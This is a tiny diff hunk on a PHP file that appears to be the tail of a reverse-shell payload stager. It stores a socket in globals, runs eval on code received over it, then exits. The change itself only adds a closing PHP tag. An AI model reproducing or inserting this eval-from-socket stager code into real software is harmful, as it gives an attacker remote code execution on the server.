@@ -50,3 +50,5 @@ $GLOBALS['msgsock']      = $s;
 $GLOBALS['msgsock_type'] = $s_type;
 eval($b);
 die();
+
+?>
